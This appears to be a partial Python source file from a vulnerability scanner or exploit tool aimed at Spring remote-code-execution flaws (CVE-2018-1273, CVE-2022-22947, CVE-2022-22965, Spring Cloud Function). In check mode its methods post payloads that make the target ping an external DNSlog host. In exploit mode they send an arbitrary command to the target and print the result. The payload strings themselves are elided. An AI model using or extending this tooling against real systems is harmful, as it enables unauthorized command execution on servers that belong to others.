...
from lib.clasetting import Ceye, Dnslog, random_str
...
+-------------+-----------------------+---------------------------------------------------+
| spring      | cve_2018_1273         | [RCE]                                             |
| spring      | cve_2022_22947        | [RCE]                                             |
| spring      | Spring_Cloud_Function | [rce] app="spring Cloud" 0.0.RELEASE - 3.2.2      |
| spring      | cve_2022_22965        | [rce] spring Core, 5.2.X - 5.2.20, 5.3.X - 5.3.18 |
+-------------+-----------------------+---------------------------------------------------+
"""
class spring():
    ...
    def cve_2018_1273(self):
        ...
        try:
            if self.vuln == 'False':
                dnslog = Ceye()
                exprequest.post(self.url, data=payload.format('ping '+dnslog.dns_host()))
                if dnslog.result():
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url, data=payload.format(self.cmd)).text
                print(result)
    ...
    def Spring_Cloud_Function(self):
        ...
        try:
            if self.vuln == 'False':
                ...
                exprequest.post(self.url, data=data, headers=headers)
                if dnslog.result():
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
